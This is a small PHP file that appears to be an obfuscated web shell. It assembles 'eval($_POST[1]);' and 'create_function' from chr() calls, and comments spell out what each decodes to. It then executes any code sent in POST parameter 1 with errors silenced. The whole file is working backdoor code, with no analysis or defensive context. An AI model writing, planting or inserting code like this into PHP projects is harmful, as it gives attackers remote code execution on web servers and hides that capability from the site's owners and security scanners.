<?php
    $_chr = chr(99).chr(104).chr(114); //chr  
    $_eval_post_1 = $_chr(101).$_chr(118).$_chr(97).$_chr(108).$_chr(40).$_chr(36).$_chr(95).$_chr(80).$_chr(79).$_chr(83).$_chr(84).$_chr(91).$_chr(49).$_chr(93).$_chr(41).$_chr(59); //eval($_POST[1]); 
    $_create_function = $_chr(99).$_chr(114).$_chr(101).$_chr(97).$_chr(116).$_chr(101).$_chr(95).$_chr(102).$_chr(117).$_chr(110).$_chr(99).$_chr(116).$_chr(105).$_chr(111).$_chr(110); //create_function 

    $_= $_create_function("",$_eval_post_1); //die(var_dump($_create_function ));
    @$_();
?>